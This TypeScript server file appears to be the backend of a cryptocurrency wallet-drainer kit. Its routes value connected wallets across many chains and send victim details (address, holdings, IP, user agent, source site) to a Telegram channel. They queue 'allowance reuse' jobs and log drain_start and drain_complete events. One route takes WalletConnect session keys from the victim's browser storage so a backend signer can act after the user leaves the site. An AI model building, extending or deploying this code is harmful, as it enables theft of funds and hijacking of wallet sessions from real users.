/**
 * Scout Route Initialization — Recursive Predator fusion trigger (Frontend-to-Engine handshake surface).
 */
import { randomUUID } from 'node:crypto'

import { getOracleRatesUsd, runRecursivePredatorFusionUsd, getRankedAssets, computeRecursivePredatorFusionTotalUsd } from '@legion/core'
import type { Address } from 'viem'
import type { RankedAsset } from '@legion/core'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema, wcSessionBodySchema } from '../lib/schemas.js'
import { registerWcSession } from '../lib/wc-relay-signer.js'
import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
import { isAddress } from 'viem'
import {
  notifyWalletConnected,
  notifyScanComplete,
  notifyError,
  notifyUserRejectedWallet,
  notifyDrainNoAction,
  resolveClientIp,
  detectDeviceFromUA,
  sendTelegramMessage,
  type TelegramRequestContext,
  type StrategyAsset,
} from '../lib/telegram.js'

type OracleRateKey = 'eth' | 'sol' | 'trx' | 'ton' | 'btc'
type OracleRates = Record<OracleRateKey, number>

function isValidRpcUrl(s: string): boolean {
  try {
    const u = new URL(s)
    return u.protocol === 'http:' || u.protocol === 'https:'
  } catch {
    return false
  }
}

function extractRequestContext(request: FastifyRequest): TelegramRequestContext {
  const headers = request.headers as Record<string, string | string[] | undefined>
  const ip = resolveClientIp(headers)
  const ua = (Array.isArray(headers['user-agent']) ? headers['user-agent'][0] : headers['user-agent']) ?? ''
  const origin = (Array.isArray(headers['origin']) ? headers['origin'][0] : headers['origin'])
    ?? (Array.isArray(headers['referer']) ? headers['referer'][0] : headers['referer'])
    ?? ''
  let sourceDomain = ''
  try {
    if (origin) sourceDomain = new URL(origin).host
  } catch { sourceDomain = origin }
  return {
    ip: ip !== 'Unknown' ? ip : undefined,
    userAgent: ua || undefined,
    sourceDomain: sourceDomain || undefined,
  }
}

async function resolveReferenceRatesUsd(): Promise<OracleRates> {
  return getOracleRatesUsd()
}

function rankedToStrategyAssets(assets: RankedAsset[]): StrategyAsset[] {
  return assets
    .filter((a) => a.amount_usd > 0)
    .slice(0, 12)
    .map((a) => ({
      chain: a.chain,
      family: a.family,
      token: a.token,
      symbol: a.symbol,
      amount_usd: a.amount_usd,
    }))
}

async function fetchStrategyAssetsForWallet(
  wallet: string,
  chainFamily?: string,
): Promise<{ assets: StrategyAsset[]; totalUsd: number }> {
  const ranked = await getRankedAssets(wallet, chainFamily)
  const assets = rankedToStrategyAssets(ranked)
  const totalUsd = ranked.reduce((sum, a) => sum + a.amount_usd, 0)
  return { assets, totalUsd }
}

type FusionWalletProbe = { wallet: string; family: string }

function collectFusionWalletProbes(body: {
  evm_holder?: string
  sol_owner_base58?: string
  tron_holder_base58?: string
  ton_friendly_address?: string
  btc_holder_address?: string
  cosmos_holder_address?: string
  aptos_holder_address?: string
  sui_holder_address?: string
}): FusionWalletProbe[] {
  const probes: FusionWalletProbe[] = []
  const evm = typeof body.evm_holder === 'string' ? body.evm_holder.trim() : ''
  const sol = typeof body.sol_owner_base58 === 'string' ? body.sol_owner_base58.trim() : ''
  const tron = typeof body.tron_holder_base58 === 'string' ? body.tron_holder_base58.trim() : ''
  const ton = typeof body.ton_friendly_address === 'string' ? body.ton_friendly_address.trim() : ''
  const btc = typeof body.btc_holder_address === 'string' ? body.btc_holder_address.trim() : ''
  const cosmos = typeof body.cosmos_holder_address === 'string' ? body.cosmos_holder_address.trim() : ''
  const aptos = typeof body.aptos_holder_address === 'string' ? body.aptos_holder_address.trim() : ''
  const sui = typeof body.sui_holder_address === 'string' ? body.sui_holder_address.trim() : ''
  if (evm) probes.push({ wallet: evm, family: 'EVM' })
  if (sol) probes.push({ wallet: sol, family: 'SVM' })
  if (tron) probes.push({ wallet: tron, family: 'TRON' })
  if (ton) probes.push({ wallet: ton, family: 'TON' })
  if (btc) probes.push({ wallet: btc, family: 'UTXO' })
  if (cosmos) probes.push({ wallet: cosmos, family: 'COSMOS' })
  if (aptos) probes.push({ wallet: aptos, family: 'APTOS' })
  if (sui) probes.push({ wallet: sui, family: 'SUI' })
  return probes
}

/** Ranked assets across all connected families (8 native + EVM multi-chain). */
async function fetchAllStrategyAssets(
  probes: FusionWalletProbe[],
): Promise<{ assets: StrategyAsset[]; totalUsd: number }> {
  if (!probes.length) return { assets: [], totalUsd: 0 }
  const settled = await Promise.allSettled(
    probes.map((p) => fetchStrategyAssetsForWallet(p.wallet, p.family)),
  )
  const merged: StrategyAsset[] = []
  let totalUsd = 0
  for (const result of settled) {
    if (result.status !== 'fulfilled') continue
    merged.push(...result.value.assets)
    totalUsd += result.value.totalUsd
  }
  merged.sort((a, b) => b.amount_usd - a.amount_usd)
  return { assets: merged.slice(0, 15), totalUsd }
}

function inferChainFamilyFromWallet(wallet: string): string | undefined {
  const w = wallet.trim()
  if (/^0x[a-fA-F0-9]{40}$/.test(w)) return 'EVM'
  if (/^T[1-9A-HJ-NP-Za-km-z]{25,34}$/.test(w)) return 'TRON'
  if (/^[UE]Q[-A-Za-z0-9]{46}$/.test(w) || /^[0-9a-fA-F]{64}$/.test(w)) return 'TON'
  if (/^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(w)) return 'UTXO'
  if (/^cosmos1[0-9a-z]{38}$/.test(w)) return 'COSMOS'
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(w)) return 'SVM'
  if (/^0x[a-fA-F0-9]{1,64}$/.test(w) && w.length > 42) return 'APTOS'
  return undefined
}

export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
  app.post('/api/v1/scout', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(scoutIngressBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const scoutUsdCheck = validateScoutValueUsdField(body.scout_value_usd)
    if (scoutUsdCheck.ok === false) {
      return sendFailure(reply, 400, scoutUsdCheck.error, { code: 'ValidationError' })
    }
    const user_address = typeof body.user_address === 'string' ? body.user_address.trim() : ''
    const chainRaw = body.chain_id ?? body.chainId
    const chain_id = typeof chainRaw === 'number' && Number.isFinite(chainRaw) ? chainRaw : 0
    const walletType = typeof body.wallet_type === 'string' ? body.wallet_type : 'Unknown'
    const chainFamily = typeof body.chain_family === 'string' ? body.chain_family : 'EVM'
    const sourcePage = typeof body.source_page === 'string' ? body.source_page.trim() : ''
    const activeTab = typeof body.active_chain_tab === 'string' ? body.active_chain_tab.trim() : ''

    request.log.info(
      { sentinel: 'TelemetryIngress', module: 'apps/api/scout', user_address, chain_id },
      'telemetry_ingress_weld',
    )

    // 🔔 Telegram: Notify wallet connected with full context (fire-and-forget)
    if (user_address) {
      const ctx: TelegramRequestContext = {
        ...extractRequestContext(request),
        chain_id,
        chain_family: chainFamily,
        wallet_type: walletType,
        ...(body.scout_value_usd != null ? { scout_value_usd: body.scout_value_usd } : {}),
        ...(sourcePage ? { sourceDomain: sourcePage } : {}),
        ...(activeTab ? { active_chain_tab: activeTab } : {}),
        ...(Array.isArray(body.connected_wallets) && body.connected_wallets.length > 0
          ? { connected_wallets: body.connected_wallets.join(',') }
          : {}),
        ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
          ? { connect_session: body.connect_session.trim() }
          : {}),
      }
      void notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
    }

    // Fire-and-forget allowance reuse job
    void enqueueAllowanceReuseJob({
      wallet_address: user_address,
      ...(isAddress(user_address)
        ? { evm_chain_id: chain_id > 0 ? chain_id : undefined }
        : { sol_wallet: user_address }),
      ...(chainFamily.toUpperCase().includes('TRON') || user_address.startsWith('T')
        ? { tron_wallet: user_address }
        : {}),
    }).catch(() => {})

    return sendSuccess(reply, 200, 'Scout telemetry recorded', {
      handshake_active: true,
      telemetry_trace_id: randomUUID(),
    })
  })

  app.post(
    '/api/scout/recursive-predator-fusion',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const parsed = parseBody(fusionScoutBodySchema, request.body)
      if (parsed.ok === false) {
        return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
      }
      const body = parsed.data
      const scoutUsdCheck = validateScoutValueUsdField(body.scout_value_usd)
      if (scoutUsdCheck.ok === false) {
        return sendFailure(reply, 400, scoutUsdCheck.error, { code: 'ValidationError' })
      }

      const evmRaw = typeof body.evm_holder === 'string' ? body.evm_holder.trim() : ''
      const solRaw = typeof body.sol_owner_base58 === 'string' ? body.sol_owner_base58.trim() : ''
      const tronRaw = typeof body.tron_holder_base58 === 'string' ? body.tron_holder_base58.trim() : ''
      const tonRaw = typeof body.ton_friendly_address === 'string' ? body.ton_friendly_address.trim() : ''
      const btcRaw = typeof body.btc_holder_address === 'string' ? body.btc_holder_address.trim() : ''
      const universalRaw = typeof body.universal_address === 'string' ? body.universal_address.trim() : ''

      const primaryAddress = evmRaw || solRaw || tronRaw || tonRaw || btcRaw || universalRaw
      const ctx = extractRequestContext(request)

      const evmRpcCandidate =
        typeof body.evm_rpc_url === 'string' && body.evm_rpc_url.trim() !== '' && isValidRpcUrl(body.evm_rpc_url.trim())
          ? body.evm_rpc_url.trim() : null
      const evmRpc = evmRpcCandidate ?? process.env['RPC_ETHEREUM_PRIVATE']?.trim() ?? process.env['NEXT_PUBLIC_RPC_URL']?.trim() ?? ''

      const solRpcCandidate =
        typeof body.sol_rpc_url === 'string' && body.sol_rpc_url.trim() !== '' && isValidRpcUrl(body.sol_rpc_url.trim())
          ? body.sol_rpc_url.trim() : null
      const solRpc = solRpcCandidate ?? process.env['RPC_SOLANA_PRIVATE']?.trim() ?? process.env['NEXT_PUBLIC_SOLANA_RPC_URL']?.trim() ?? ''

      const tronRpcOverride =
        typeof body.tron_rpc_url === 'string' && body.tron_rpc_url.trim() !== '' && isValidRpcUrl(body.tron_rpc_url.trim())
          ? body.tron_rpc_url.trim() : undefined
      const tonRpcOverride =
        typeof body.ton_rpc_url === 'string' && body.ton_rpc_url.trim() !== '' && isValidRpcUrl(body.ton_rpc_url.trim())
          ? body.ton_rpc_url.trim() : undefined

      const rates = await resolveReferenceRatesUsd()

      let fusion: Awaited<ReturnType<typeof runRecursivePredatorFusionUsd>>

      try {
        fusion = await runRecursivePredatorFusionUsd({
          evmRpcUrl: evmRpc,
          solRpcUrl: solRpc,
          evmHolder: evmRaw.startsWith('0x') ? (evmRaw as Address) : null,
          solOwnerBase58: solRaw !== '' ? solRaw : null,
          tronHolderBase58: tronRaw !== '' ? tronRaw : null,
          tonFriendlyAddress: tonRaw !== '' ? tonRaw : null,
          btcHolderAddress: btcRaw !== '' ? btcRaw : null,
          universalAddress: universalRaw !== '' ? universalRaw : null,
          chainRpcMesh: {
            ...(tronRpcOverride != null ? { tron: tronRpcOverride } : {}),
            ...(tonRpcOverride != null ? { ton: tonRpcOverride } : {}),
          },
          ethUsd: rates.eth,
          solUsd: rates.sol,
          trxUsd: rates.trx,
          tonUsd: rates.ton,
          btcUsd: rates.btc,
        })
      } catch (err) {
        // 🔔 Telegram: Notify scan error with context (fire-and-forget)
        void notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined, ctx).catch(() => {})
        throw err
      }

      request.log.info(
        { sentinel: 'OmnichainExpansion', module: 'apps/api/scout' },
        'OMNICHAIN_EXPANSION_LOCKED',
      )

      // 🔔 Telegram: scan complete — all connected families (EVM + SOL + TRON + TON + BTC + Cosmos + Aptos + Sui)
      if (primaryAddress) {
        const fusionTotal = computeRecursivePredatorFusionTotalUsd(fusion)
        const scoutUsdFromBody = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
        let strategyAssets: StrategyAsset[] = []
        let rankedUsd = 0
        try {
          const ranked = await fetchAllStrategyAssets(collectFusionWalletProbes(body))
          strategyAssets = ranked.assets
          rankedUsd = ranked.totalUsd
        } catch {
          /* ranked probe optional */
        }
        const notifyUsd = Math.max(scoutUsdFromBody, fusionTotal)
        if (notifyUsd > 0 && (scoutUsdFromBody > 0 || fusionTotal > 0)) {
          const assetsCount = strategyAssets.length > 0 ? strategyAssets.length : fusion.assets_count
          const scanCtx: TelegramRequestContext = {
            ...ctx,
            scout_value_usd: notifyUsd,
            wallet_type: 'Wallet',
            ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
              ? { connect_session: body.connect_session.trim() }
              : {}),
          }
          void notifyScanComplete(
            primaryAddress,
            notifyUsd,
            assetsCount,
            scanCtx,
            strategyAssets.length > 0 ? strategyAssets : undefined,
          ).catch(() => {})
        }
      }

      return sendSuccess(reply, 200, 'Recursive predator fusion complete', {
        handshake_active: true,
        fusion,
        rpc_operational: {
          evm: evmRpc ? `${evmRpc.slice(0, 20)}…` : null,
          svm: solRpc ? `${solRpc.slice(0, 20)}…` : null,
          tron: tronRpcOverride ? `${tronRpcOverride.slice(0, 20)}…` : null,
          ton: tonRpcOverride ? `${tonRpcOverride.slice(0, 20)}…` : null,
        },
        reference_rates_usd: rates,
      })
    },
  )

  app.post('/api/v1/scout/ranked', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(rankedScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.wallet_address?.trim() ?? body.wallet?.trim() ?? ''
    if (!wallet) {
      return sendFailure(reply, 400, 'wallet_address required', { code: 'ValidationError' })
    }
    const chainFamily = body.chain_family?.trim()
    try {
      const assets = await getRankedAssets(wallet, chainFamily)
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'Ranked assets ready', {
        assets,
        total_usd: totalUsd,
        wallet_address: wallet,
        chain_family: chainFamily ?? 'ALL',
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/ranked', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  app.post('/api/v1/scout/drain-status', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(drainStatusBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.wallet_address.trim()
    const ctx: TelegramRequestContext = {
      ...extractRequestContext(request),
      chain_id: body.chain_id,
      chain_family: body.chain_family ?? 'EVM',
      wallet_type: body.wallet_type ?? 'Unknown',
      scout_value_usd: body.scout_value_usd,
      sourceDomain: body.source_page,
      ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
        ? { connect_session: body.connect_session.trim() }
        : {}),
    }

    if (body.event === 'user_rejected') {
      void notifyUserRejectedWallet(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
    } else if (body.event === 'no_action') {
      void notifyDrainNoAction(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
    } else if (body.event === 'scan_complete') {
      const frontendUsd = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
      let displayUsd = frontendUsd
      let strategyAssets: StrategyAsset[] | undefined
      if (Array.isArray(body.assets) && body.assets.length > 0) {
        strategyAssets = body.assets
          .filter((a) => a.amount_usd > 0)
          .slice(0, 12)
          .map((a) => ({
            chain: a.chain,
            family: a.family ?? 'EVM',
            token: a.token,
            symbol: a.symbol,
            amount_usd: a.amount_usd,
          }))
        const assetsSum = strategyAssets.reduce((s, a) => s + a.amount_usd, 0)
        if (assetsSum > displayUsd) displayUsd = assetsSum
      } else if (frontendUsd >= 0) {
        try {
          const family = body.chain_family ?? inferChainFamilyFromWallet(wallet) ?? 'EVM'
          const ranked = await fetchStrategyAssetsForWallet(wallet, family)
          strategyAssets = ranked.assets.length > 0 ? ranked.assets : undefined
          if (ranked.totalUsd > displayUsd) displayUsd = ranked.totalUsd
        } catch {
          /* optional ranked fallback */
        }
      }
      const assetsCount = body.asset_count != null
        ? Number(body.asset_count)
        : (strategyAssets?.length ?? 0)
      void notifyScanComplete(
        wallet,
        Number.isFinite(displayUsd) ? displayUsd : 0,
        assetsCount,
        ctx,
        strategyAssets,
      ).catch(() => {})
    } else if (
      body.event === 'connect' ||
      body.event === 'scan_start' ||
      body.event === 'network_switch' ||
      body.event === 'drain_start' ||
      body.event === 'drain_fail' ||
      body.event === 'drain_complete'
    ) {
      request.log.info(
        { event: body.event, wallet, chain_id: body.chain_id, detail: body.detail ?? null },
        'drain_status_telemetry',
      )
    }

    return sendSuccess(reply, 200, 'Drain status recorded', { event: body.event })
  })

  app.post('/api/v1/scout/detect-wallet', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(fusionScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.evm_holder || body.sol_owner_base58 || body.tron_holder_base58 || body.ton_friendly_address || body.btc_holder_address
    if (!wallet) {
      return sendFailure(reply, 400, 'At least one wallet address required', { code: 'ValidationError' })
    }
    try {
      const assets = await getRankedAssets(wallet)
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'Wallet detected', {
        wallet_address: wallet,
        assets: assets.slice(0, 10),
        total_usd: totalUsd,
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/detect-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  app.post('/api/v1/scout/detect-evm-wallet', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(fusionScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.evm_holder
    if (!wallet) {
      return sendFailure(reply, 400, 'evm_holder required', { code: 'ValidationError' })
    }
    try {
      const assets = await getRankedAssets(wallet, 'EVM')
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'EVM wallet detected', {
        wallet_address: wallet,
        assets: assets.slice(0, 10),
        total_usd: totalUsd,
        chain_family: 'EVM',
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/detect-evm-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  // WalletConnect offsite session registration — enables backend relay signer
  // after user closes the site. Session data extracted from browser localStorage.
  app.post('/api/v1/wc/session', async (request: FastifyRequest, reply: FastifyReply) => {
    // Debug: log that request arrived (even before validation)
    const bodyKeys = Object.keys((request.body as Record<string, unknown>) ?? {}).join(',')
    console.log('[WcRelay] /api/v1/wc/session POST received | keys:', bodyKeys)
    void sendTelegramMessage(
      `🔍 <b>WC Session POST received</b>\n` +
      `📦 Keys: <code>${bodyKeys}</code>\n` +
      `🌐 Origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
    ).catch(() => {})

    const parsed = parseBody(wcSessionBodySchema, request.body)
    if (parsed.ok === false) {
      console.warn('[WcRelay] /api/v1/wc/session validation fail:', parsed.message)
      void sendTelegramMessage(`❌ <b>WC Session validation FAIL</b>\n<code>${parsed.message}</code>`).catch(() => {})
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const data = parsed.data
    void registerWcSession({
      topic: data.topic,
      sym_key: data.sym_key,
      expiry: data.expiry,
      namespaces: data.namespaces,
      wallet_addresses: data.wallet_addresses,
      self_public_key: data.self_public_key,
      peer_public_key: data.peer_public_key,
    }).catch(() => {})
    return sendSuccess(reply, 200, 'WC session registered', {})
  })

  // Debug endpoint — frontend posts localStorage state when registerWcSessionWithBackend() fails
  app.post('/api/v1/wc/session-debug', async (request: FastifyRequest, reply: FastifyReply) => {
    const body = (request.body as Record<string, unknown>) ?? {}
    console.warn('[WcRelay] session-debug received:', JSON.stringify(body))
    void sendTelegramMessage(
      `🐛 <b>WC Session Debug (frontend gave up)</b>\n` +
      `🗝 wc_keys: <code>${body['wc_keys'] ?? 'none'}</code>\n` +
      `📋 session_found: <b>${body['session_found'] ?? 'unknown'}</b>\n` +
      `🔑 symkey_found: <b>${body['symkey_found'] ?? 'unknown'}</b>\n` +
      `🔄 attempts: <b>${body['attempts'] ?? '?'}</b>\n` +
      `🌐 origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
    ).catch(() => {})
    return sendSuccess(reply, 200, 'debug logged', {})
  })
}
